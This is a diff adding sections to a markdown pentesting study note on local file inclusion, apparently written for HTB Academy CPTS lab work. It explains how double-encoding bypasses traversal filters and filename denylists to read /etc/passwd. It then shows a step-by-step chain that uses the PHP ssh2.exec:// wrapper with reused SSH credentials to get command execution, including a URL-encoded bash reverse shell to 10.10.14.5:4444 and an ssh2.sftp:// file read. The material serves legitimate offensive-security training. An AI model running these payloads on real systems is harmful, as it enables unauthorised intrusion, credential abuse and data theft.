@@ -141,6 +141,29 @@ Start with approved path then traverse:
 ?language=./languages/../../flag.txt%00.php
 ```
 
+### Decode-order / parser differential — *why* double-encoding works
+
+Double-encoding isn't a magic string; it exploits a **decode-order gap**. The filter and the sink run at *different decode stages*:
+
+1. `.%252e%252f` arrives on the wire → the web server does the standard **one** URL-decode → `.%2e%2f`.
+2. The app's filter inspects **that** string. No literal `../`, so it **passes**.
+3. The app then calls `urldecode()` on the parameter itself — a **second** decode → `../` — and hands it to the sink.
+
+> [!tip] **The vuln is not "there is no filter" — it's "the filter runs at a different decode stage than the sink."** Any input transformation applied *after* validation reopens whatever the validation closed. This is the same root cause as a command-injection double-parse (see [[Class notes/HTB Academy/CPTS v2 (claude)/Command Injection|Command Injection]] → *Re-parsed shell string*): data validated in one representation, then interpreted in another.
+
+**Filename denylists sit at the same stage — encode a byte of the *filename*, not just the separators.** A separate keyword denylist (`etc/passwd` blocked, `etc/hosts` allowed) also runs pre-decode. Double-encode any byte inside the filename and the denylist goes blind:
+
+```bash
+# %2577 -> %77 after the wire decode (filter never sees "passwd") -> "w" after the app decode
+?path=etc/pass%2577d           # 200, full /etc/passwd
+```
+
+**Generalised primitive:** double-encode *any* byte of the path — separator or filename. Encoding **every** byte is strictly safer than encoding only the separators, because it defeats filename-level denylisting too.
+
+> [!warning] **Triage by response length, not status or MIME.** A file/image proxy (`img.php?path=`) often returns a fixed `Content-Type: image/png` regardless of what it actually read — raw bytes land in the body and nothing renders. Sort bulk output by **response length**; hits are trivially mistaken for misses on status/MIME alone.
+
+> [!tip] **Once you have file read, stop fuzzing the filesystem — grep the retrieved source for the app's own URLs.** `grep -rhoE '[A-Za-z0-9_/.-]+\.php'` over recovered source names its own endpoints (including ones linked from nowhere in the UI, e.g. an `activate.php` referenced only in `register.php`). Brute force is the fallback, not the first move — and re-run the grep every time new source lands. Underscore-joined compounds like `swap_theme.php` never appear in `directory-list-2.3-medium`, so a "clean" wordlist scan misses exactly what source would have handed you.
+
 ---
 
 ## PHP Wrappers & Filters
@@ -209,6 +232,48 @@ Rarely available, needs manual install
 # Check if enabled
 curl "http://target.com/?file=php://filter/read=convert.base64-encode/resource=/etc/php/php.ini" | base64 -d | grep expect
 ```
+
+### ssh2.exec:// & ssh2.sftp:// — SSH stream wrappers (LFI + creds → RCE)
+
+When the PHP **`ssh2` extension** is loaded, PHP can open an SSH connection *through a stream* — so an LFI becomes **command execution over SSH**, as long as you have SSH credentials. The chain that makes this worth knowing: you've recovered creds (reused from FTP / a DB config / a leaked file) but SSH is **firewalled from the outside** — the web server reaching `localhost:22` on your behalf is the only way to use them.
+
+**Preconditions — check all three, in this order (stop if #1 fails):**
+
+| Requirement | How to check via the LFI |
+|---|---|
+| `ssh2` extension loaded | read a `phpinfo()` (look for `SSH2 Support => enabled`), **or** base64-read `php.ini` and grep `ssh2`, **or** LFI-list `/etc/php/*/mods-available/` for `ssh2.ini`. **No ssh2 ⇒ this whole path is dead.** |
+| Valid SSH credentials | you supply them in the URL (`user:pass`) — reuse creds from FTP/DB/config leaks |
+| Sink type | `include()`/`require()` sink needs `allow_url_include=On`; a *read* sink (`file_get_contents`/`readfile`/`fopen`) only needs `allow_url_fopen` (on by default) |
+
+**URL format** — the command is everything after the host/port:
+
+```
+ssh2.exec://<user>:<pass>@<host>:<port>/<command>
+```
+
+**Procedure:**
+
+```bash
+# 1. Confirm the extension is present — do NOT skip this, it's the usual reason it "doesn't work"
+curl -s "http://target/?file=php://filter/read=convert.base64-encode/resource=/etc/php/8.1/apache2/php.ini" \
+  | base64 -d | grep -i ssh2
+#   (or read a phpinfo page and look for "SSH2 Support => enabled")
+
+# 2. Run a command as the SSH user — its stdout comes back in the response body
+curl -s "http://target/?file=ssh2.exec://yuri:mustang@127.0.0.1:22/id"
+#   -> uid=1000(yuri) gid=1000(yuri) ...
+
+# 3. Turn it into a real foothold — reverse shell (URL-encode the command: space=%20, &=%26)
+curl -s "http://target/?file=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261'"
+```
+
+> [!note] **Companion — `ssh2.sftp://` for arbitrary file read** over the same SSH session. You read as the *SSH user*, which usually sees more than `www-data` (e.g. that user's home, `user.txt`):
+> ```
+> ?file=ssh2.sftp://yuri:mustang@127.0.0.1:22/home/yuri/user.txt
+> ```
+> On some PHP builds the SFTP wrapper needs a doubled leading slash for an absolute path (`ssh2.sftp://…:22//etc/passwd`) — if a path returns empty, try adding one.
+
+> [!warning] **Why it "fails" when it should work:** (1) the `ssh2` extension is simply **not installed** on most hosts — that's step 1 for a reason, verify before assuming creds are wrong; (2) through an `include()` sink you *also* need `allow_url_include=On` — if `exec` runs nothing there, try the identical wrapper against a read-style sink, or confirm the ini setting by base64-reading `php.ini`. Host-key verification is a non-issue against `127.0.0.1`.
 
 ### zip:// - Execute from Zips
 
@@ -1225,5 +1290,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-14*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
